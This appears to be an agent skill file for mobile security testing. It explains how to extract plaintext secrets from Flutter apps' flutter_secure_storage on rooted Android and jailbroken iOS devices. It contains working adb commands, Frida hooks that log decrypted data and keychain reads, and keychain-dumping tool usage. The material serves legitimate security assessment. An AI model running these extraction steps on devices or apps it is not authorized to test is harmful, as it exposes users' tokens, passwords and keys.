---
name: flutter-secure-storage-extract
description: Use when a Flutter app stores secrets (API keys, tokens, credentials, encryption keys) via the flutter_secure_storage plugin and you need to extract the plaintext values at runtime on a rooted/jailbroken device. Covers Android (KeyStore + EncryptedSharedPreferences) and iOS (Keychain) extraction paths using adb, Frida, and keychain tools. Triggers - "flutter_secure_storage", "FlutterSecureStorage", "secure storage", "keychain flutter", "EncryptedSharedPreferences flutter", "flutter keystore", "flutter secrets"
platform: [android, ios]
stack: [flutter]
category: storage
tier: B
related: [mob-flutter, android-backup-flutter-kernel-string-extraction]
---

# Skill: Flutter Secure Storage Extract: extracting secrets from the flutter_secure_storage plugin

## What it solves
`flutter_secure_storage` is the standard plugin for storing secrets in Flutter apps.
On Android it uses **Android KeyStore + EncryptedSharedPreferences** (AES-256-GCM, or
AES-CBC with an RSA-wrapped key on Android < 23). On iOS it uses the **Keychain**
(`SecItemAdd` / `SecItemCopyMatching`). On rooted/jailbroken devices the secrets are
extractable by intercepting the moment of decryption with Frida, or by directly
accessing the storage backend.

## When to use
- You know or suspect the app uses `flutter_secure_storage` (grep the APK/IPA for:
  `flutter_secure_storage`, `FlutterSecureStoragePlugin`, `com.it_nomads`).
- You need to verify that secrets stored "securely" are recoverable on a
  compromised device.
- You want to demonstrate the app relies ONLY on local storage to protect critical
  data without additional server-side validation.

## Workflow

### 1. Confirm plugin usage

**Android:**
```bash
# In the decompiled APK (jadx or apktool)
grep -r "flutter_secure_storage\|FlutterSecureStorage\|com.it_nomads.fluttersecurestorage" .
# Search the AndroidManifest or the Java classes
grep -r "FlutterSecureStoragePlugin" .
```

**iOS:**
```bash
# In the unzipped IPA
grep -r "flutter_secure_storage" .
# In the binary
strings Payload/*.app/Frameworks/flutter_secure_storage.framework/flutter_secure_storage | head -20
```

### 2. Extract the encrypted file (Android)

```bash
# Requires root / adb root
adb shell su -c "cat /data/data/<pkg>/shared_prefs/FlutterSecureStorage.xml"
# Alternative: full pull
adb shell su -c "cp /data/data/<pkg>/shared_prefs/FlutterSecureStorage.xml /sdcard/"
adb pull /sdcard/FlutterSecureStorage.xml
```

The XML contains key-value pairs where both keys and values are encrypted
(Base64-encoded ciphertext). The encryption key is in the Android KeyStore under the
alias `FlutterSecureStorageKey` (or a custom alias if the app configured one).

In old plugin versions (pre-v5), the prefs were stored in
`FlutterSecureStorage` as regular SharedPreferences with manual AES-CBC encryption
(RSA-wrapped key in KeyStore). In v5+, it uses AndroidX Security's
`EncryptedSharedPreferences` with AES-256-GCM and the master key in KeyStore.

### 3. Intercept decrypted values with Frida (Android)

**Option A: Hook javax.crypto.Cipher.doFinal** (captures all AES decryption)
```js
Java.perform(function() {
    var Cipher = Java.use("javax.crypto.Cipher");

    // doFinal(byte[]) -> byte[]
    Cipher.doFinal.overload("[B").implementation = function(input) {
        var result = this.doFinal(input);

        // DECRYPT_MODE = 2
        if (this.getOpmode() === 2) {
            var plaintext = "";
            for (var i = 0; i < result.length; i++) {
                plaintext += String.fromCharCode(result[i] & 0xff);
            }
            console.log("[Cipher.doFinal DECRYPT] " + plaintext);

            // Show the key used
            try {
                var algo = this.getAlgorithm();
                console.log("[Cipher.doFinal]   algorithm: " + algo);
            } catch(e) {}
        }

        return result;
    };
});
```

**Option B: Hook the native plugin directly**
```js
Java.perform(function() {
    // For flutter_secure_storage v5+ (EncryptedSharedPreferences)
    var EncryptedSP = Java.use(
        "androidx.security.crypto.EncryptedSharedPreferences"
    );

    // Hook getString to see the reads
    var SharedPrefs = Java.use("android.content.SharedPreferences");

    // Alternative: hook the plugin class directly
    try {
        var Plugin = Java.use(
            "com.it_nomads.fluttersecurestorage.FlutterSecureStoragePlugin"
        );
        console.log("[*] FlutterSecureStoragePlugin found");
    } catch(e) {
        // The plugin may be in a different namespace in new versions
        try {
            var Plugin = Java.use(
                "com.it_nomads.fluttersecurestorage.FlutterSecureStorage"
            );
            console.log("[*] FlutterSecureStorage class found");
        } catch(e2) {
            console.log("[!] Plugin class not found, use Cipher hook instead");
        }
    }
});
```

**Option C: Enumerate all the keys and read their values**
```js
Java.perform(function() {
    var Context = Java.use("android.content.Context");
    var File = Java.use("java.io.File");

    // Get the app context
    var ActivityThread = Java.use("android.app.ActivityThread");
    var ctx = ActivityThread.currentApplication().getApplicationContext();

    // Read the SharedPreferences directly (encrypted values)
    var prefs = ctx.getSharedPreferences("FlutterSecureStorage", 0);
    var allEntries = prefs.getAll();
    var keys = allEntries.keySet().toArray();

    console.log("[*] FlutterSecureStorage has " + keys.length + " entries:");
    for (var i = 0; i < keys.length; i++) {
        var key = keys[i].toString();
        var val = allEntries.get(key).toString();
        console.log("  key=" + key);
        console.log("  val(encrypted)=" + val.substring(0, 80) + "...");
    }
});
```

### 4. Extract from the Keychain (iOS)

**With a command-line tool (jailbroken):**
```bash
# Using keychain-dumper (on a jailbroken device)
./keychain-dumper -a | grep -A5 "flutter_secure_storage"

# Or using objection
objection -g com.target.app explore
ios keychain dump
# Filter by service/account containing flutter_secure_storage
```

**With Frida:**
```js
// Hook SecItemCopyMatching to intercept Keychain reads
var SecItemCopyMatching = Module.findExportByName(
    "Security", "SecItemCopyMatching"
);

Interceptor.attach(SecItemCopyMatching, {
    onEnter: function(args) {
        // args[0] = CFDictionaryRef (query)
        // Parse the dictionary to see what is being looked up
        var query = ObjC.Object(args[0]);
        console.log("[SecItemCopyMatching] query: " + query.toString());
        this.resultPtr = args[1];
    },
    onLeave: function(retval) {
        if (retval.toInt32() === 0 && this.resultPtr) { // errSecSuccess = 0
            var result = ObjC.Object(ptr(this.resultPtr).readPointer());
            console.log("[SecItemCopyMatching] result: " + result.toString());
        }
    }
});

// Hook SecItemAdd to see what gets written
var SecItemAdd = Module.findExportByName("Security", "SecItemAdd");
Interceptor.attach(SecItemAdd, {
    onEnter: function(args) {
        var attrs = ObjC.Object(args[0]);
        console.log("[SecItemAdd] attributes: " + attrs.toString());
    }
});
```

### 5. What to look for in the extracted data

- **API keys / tokens**: long alphanumeric strings, JWTs (`eyJ...`), bearer tokens.
- **User credentials**: locally stored passwords, PINs.
- **Encryption keys**: binary values (hex/base64) of 16/24/32 bytes used to
  encrypt data in the app.
- **Refresh tokens**: OAuth tokens that allow obtaining new access tokens without
  re-authentication.
- **Data that should live only on the server**: any secret whose exposure
  compromises security even without physical access to the device.

## What the finding confirms
- Decrypted values extracted by Frida contain secrets (tokens, keys, credentials)
  the app uses for critical operations.
- The app relies ONLY on `flutter_secure_storage` to protect sensitive data
  without additional server-side validation (e.g.: the extracted token allows
  using the API without further restrictions).
- Locally stored secrets that should be ephemeral (e.g.: session tokens without
  short expiry).

## Limitations
- On non-rooted Android you cannot access `/data/data/<pkg>/`. The Frida hook
  requires root or a debuggable device.
- On non-jailbroken iOS, the Keychain is protected by the Secure Enclave. You need
  a jailbreak to access it.
- `flutter_secure_storage` on compromised devices is inherently extractable.
  That is by design. The relevant finding is when the app **has no additional
  controls** (server-side validation, certificate pinning, token binding) and relies
  only on local storage.
- Plugin versions differ: pre-v5 uses AES-CBC with an RSA-wrapped key, v5+ uses
  EncryptedSharedPreferences. The Frida approach (Cipher.doFinal) works for both.
- On Android 9+ with StrongBox, the key may be in hardware: but decryption
  still goes through `Cipher.doFinal`, which is hookable.
